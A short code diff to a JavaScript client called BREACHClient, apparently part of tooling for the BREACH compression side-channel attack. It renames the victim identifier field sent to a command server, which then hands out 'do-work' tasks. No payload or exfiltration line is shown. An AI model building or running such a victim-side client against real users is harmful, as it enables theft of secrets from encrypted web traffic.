@@ -11,7 +11,7 @@ var BREACHClient = {
         this._socket.on('connect', () => {
             console.log('Connected');
             this._socket.emit('client-hello', {
-                VICTIM_ID: config.VICTIM_ID
+                victim_id: config.VICTIM_ID
             });
         });
         this._socket.on('do-work', (work) => {
